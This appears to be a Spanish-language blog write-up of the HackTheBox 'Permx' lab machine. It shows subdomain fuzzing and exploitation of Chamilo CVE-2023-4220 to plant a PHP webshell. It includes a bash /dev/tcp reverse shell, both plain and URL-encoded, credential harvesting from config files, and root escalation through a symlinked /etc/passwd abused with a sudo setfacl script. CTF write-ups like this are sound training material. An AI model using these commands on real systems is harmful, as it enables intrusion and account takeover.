@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Permx Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="Esta es una máquina de nivel Easy de la plataforma HackTheBox">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Permx Machine - HackTheBox">
+  <meta name="twitter:description" content="Esta es una máquina de nivel Easy de la plataforma HackTheBox">
+
+<meta property="og:url" content="https://celero0.github.io/posts/permx/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Permx Machine - HackTheBox">
+  <meta property="og:description" content="Esta es una máquina de nivel Easy de la plataforma HackTheBox">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-02-14T16:44:24+00:00">
+    <meta property="article:modified_time" content="2026-02-14T16:44:24+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/permx/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/permx/">
+              Permx Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2026-02-14T16:44:24Z">
+                February 14, 2026
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              4-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Machine #Linux #Easy #CVE-2023-4220</li>
+</ul>
+<hr>
+<h1 id="introducción">
+  Introducción
+  <a class="heading-link" href="#introducci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Esta es una máquina Linux que aloja un servidor web en la cual, después de realizar <em>fuzzing</em> de subdominios, encontramos un login de <code>Chamilo 1</code>, el cual es vulnerable a <code>CVE-2023-4220</code>, lo que permite RCE mediante la subida de un archivo <code>PHP</code> malicioso.<br>
+Una vez dentro de la máquina víctima, al leer los archivos de configuración de la base de datos, encontramos una contraseña en texto plano que es reutilizada por un usuario de bajos privilegios del sistema.<br>
+Posteriormente, al revisar los permisos de <code>sudo</code>, encontramos un script que permite cambiar los permisos de archivos dentro de un directorio específico. Mediante un enlace simbólico, somos capaces de modificar permisos de archivos fuera de ese directorio, lo que nos permite escalar privilegios y obtener acceso total al sistema.</p>
+<h1 id="enumeración-nmap">
+  Enumeración Nmap
+  <a class="heading-link" href="#enumeraci%c3%b3n-nmap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Realizamos un escaneo de los puertos, encontrando el puerto <code>80</code> abierto, que está corriendo el servicio <code>HTTP</code>, y el puerto <code>22</code>, que corre el servicio <code>SSH</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.129.8.242 -oG allPorts
+</span></span></code></pre></div><p>Realizamos un escaneo de versiones de los servicios</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80 -sCV 10.129.8.242 -oN portServices
+</span></span></code></pre></div><p>Encontrando que el servicio HTTP nos muestra el dominio de la página web</p>
+<img src="/images/Pasted image 20260203175029.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto, lo agregaremos a nuestro <code>/etc/hosts</code></p>
+<img src="/images/Pasted image 20260203175113.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="enumeración-puerto-80">
+  Enumeración puerto 80
+  <a class="heading-link" href="#enumeraci%c3%b3n-puerto-80">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Revisando la página web, no encontramos nada interesante</p>
+<img src="/images/Pasted image 20260203175200.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto realizaremos un fuzzing de subdominios, de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://permx.htb/ -H <span style="color:#a5d6ff">&#34;Host: FUZZ.permx.htb&#34;</span> -fl <span style="color:#a5d6ff">10</span>
+</span></span></code></pre></div><p>Encontrando dos subdominios: <code>www</code>, <code>lms</code>.</p>
+<p>Por tanto los agregaremos a nuestro <code>/etc/hosts</code></p>
+<img src="/images/Pasted image 20260203175443.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si vemos el subdominio <code>www</code>, vemos que nos lleva a la misma página web anterior, si vamos al subdominio <code>lms</code>, encontramos una página de login</p>
+<img src="/images/Pasted image 20260203175535.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>La página de login es de <code>Chamilo</code>, utilizamos <code>whatweb</code>, para ver las tecnologías de este nuevo subdominio</p>
+<p>Encontrando aparentemente, que la versión de <code>Chamilo</code> es la <code>1</code></p>
+<img src="/images/Pasted image 20260203175705.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="explotando-chamilo-1-cve-2023-4220">
+  Explotando Chamilo 1 CVE-2023-4220
+  <a class="heading-link" href="#explotando-chamilo-1-cve-2023-4220">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Realizando una pequeña búsqueda de <code>Chamilo 1 vuln</code>, nos encontramos las siguientes vulnerabilidades</p>
+<img src="/images/Pasted image 20260203175817.png" style="width:100%; height:auto; display:block; margin:auto;">
+<hr>
+<p>El <code>CVE-2023-4220</code> permite la subida de archivos sin necesitar autenticación, lo cual abre una vía potencial a ejecutar código malicioso mediante una webshell</p>
+<p>Para ello se manda una petición POST a la siguiente ruta</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>main/inc/lib/javascript/bigupload/inc/bigUpload.php?action<span style="color:#ff7b72;font-weight:bold">=</span>post-unsupported
+</span></span></code></pre></div><p>Y agregamos el content type, y el boundary</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Content-Type: multipart/form-data;<span style="color:#79c0ff">boundary</span><span style="color:#ff7b72;font-weight:bold">=</span>---------------------------1234567890
+</span></span></code></pre></div><hr>
+<p>La petición queda como se muestra a continuación</p>
+<img src="/images/Pasted image 20260212184506.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si vamos a <code>/main/inc/lib/javascript/bigupload/files/rce.php?cmd=id</code> podemos ejecutar comandos mediante la webshell</p>
+<img src="/images/Pasted image 20260212184559.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="consiguiendo-shell">
+  Consiguiendo shell
+  <a class="heading-link" href="#consiguiendo-shell">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Para obtener la shell, vamos a utilizar la siguiente reverse</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#a5d6ff">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.42/4443 0&gt;&amp;1&#39;</span>
+</span></span></code></pre></div><p>y la pasamos a <code>URL-encoded</code>, quedando de la siguiente manera</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%34%32%2f%34%34%34%33%20%30%3e%26%31%27
+</span></span></code></pre></div><p>Lo enviamos y obtenemos la shell</p>
+<img src="/images/Pasted image 20260212184833.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="movimiento-lateral">
+  Movimiento lateral
+  <a class="heading-link" href="#movimiento-lateral">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Si volvemos al directorio principal de <code>Chamilo</code>, y buscamos la contraseña de la base de datos, con el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -r -i <span style="color:#a5d6ff">&#34;db_password&#34;</span> 2&gt;/dev/null
+</span></span></code></pre></div><p>Encontramos que el archivo <code>/app/config/configuration.php</code> muestra una contraseña</p>
+<img src="/images/Pasted image 20260212191924.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto lo vemos a más detalle y encontramos las credenciales de la base de datos <code>chamilo:03F6lY3uXAP2bkW8</code></p>
+<img src="/images/Pasted image 20260212192043.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora listamos los usuarios existentes en la máquina víctima, encontrando que existen <code>mtz</code> y <code>root</code></p>
+<img src="/images/Pasted image 20260212192134.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto probamos si se realiza reutilización de contraseñas en alguno de los usuarios, y vemos que el usuario <code>mtz</code>, utiliza la misma contraseña que la de la base de datos</p>
+<img src="/images/Pasted image 20260212192229.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por consecuencia, nos conectaremos por <code>SSH</code>, para tener una consola más estable</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh mtz@permx.htb
+</span></span></code></pre></div><img src="/images/Pasted image 20260212192319.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="escalada-de-privilegios">
+  Escalada de privilegios
+  <a class="heading-link" href="#escalada-de-privilegios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Si vemos qué comando podemos utilizar con <code>sudo</code>, vemos que tenemos permiso para ejecutar el script <code>/opt/acl.sh</code>, sin la necesidad de proporcionar contraseña.</p>
+<img src="/images/Pasted image 20260212192416.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Analizando el script, es el siguiente</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$#</span><span style="color:#a5d6ff">&#34;</span> -ne <span style="color:#a5d6ff">3</span> <span style="color:#ff7b72;font-weight:bold">]</span>; <span style="color:#ff7b72">then</span>
+</span></span><span style="display:flex;"><span>    /usr/bin/echo <span style="color:#a5d6ff">&#34;Usage: </span><span style="color:#79c0ff">$0</span><span style="color:#a5d6ff"> user perm file&#34;</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">user</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$1</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">perm</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$2</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">target</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$3</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">[[</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$target</span><span style="color:#a5d6ff">&#34;</span> !<span style="color:#ff7b72;font-weight:bold">=</span> /home/mtz/* <span style="color:#ff7b72;font-weight:bold">||</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$target</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#ff7b72;font-weight:bold">==</span> *..* <span style="color:#ff7b72;font-weight:bold">]]</span>; <span style="color:#ff7b72">then</span>
+</span></span><span style="display:flex;"><span>    /usr/bin/echo <span style="color:#a5d6ff">&#34;Access denied.&#34;</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Check if the path is a file</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">[</span> ! -f <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$target</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#ff7b72;font-weight:bold">]</span>; <span style="color:#ff7b72">then</span>
+</span></span><span style="display:flex;"><span>    /usr/bin/echo <span style="color:#a5d6ff">&#34;Target must be a file.&#34;</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/bin/sudo /usr/bin/setfacl -m u:<span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$user</span><span style="color:#a5d6ff">&#34;</span>:<span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$perm</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$target</span><span style="color:#a5d6ff">&#34;</span>
+</span></span></code></pre></div><p>El script, verifica si el archivo se encuentra en el directorio <code>/home/mtz/</code>, si está ahí nos permite cambiar los permisos del archivo.</p>
+<p>Esto abre una vía potencial de escalada de privilegios, ya que si creamos un enlace simbólico hacia otro archivo, nos permite evadir la regla de que solo nos deja cambiar permisos en nuestro directorio <code>home</code></p>
+<h2 id="abusando-script-mal-implementado">
+  Abusando script mal implementado
+  <a class="heading-link" href="#abusando-script-mal-implementado">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para ello crearemos un enlace simbólico de <code>/etc/passwd</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ln -s /etc/passwd /home/mtz/passwd
+</span></span></code></pre></div><p>Luego ejecutaremos el script de la siguiente manera</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /opt/acl.sh mtz rwx /home/mtz/passwd
+</span></span></code></pre></div><p>Ahora editamos el <code>/etc/passwd</code>, quitando la <code>x</code> que está justo después de <code>root</code></p>
+<img src="/images/Pasted image 20260212201213.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Quedando así como se muestra a continuación</p>
+<img src="/images/Pasted image 20260212201246.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y ahora podemos migrar al usuario <code>root</code>, sin proporcionar contraseña</p>
+<img src="/images/Pasted image 20260212201311.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>con ello tenemos acceso a la cuenta de privilegios máximos del sistema, por tanto podemos leer las flags, y terminar la máquina.</p>
+<img src="/images/Pasted image 20260212201354.png" style="width:100%; height:auto; display:block; margin:auto;">
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
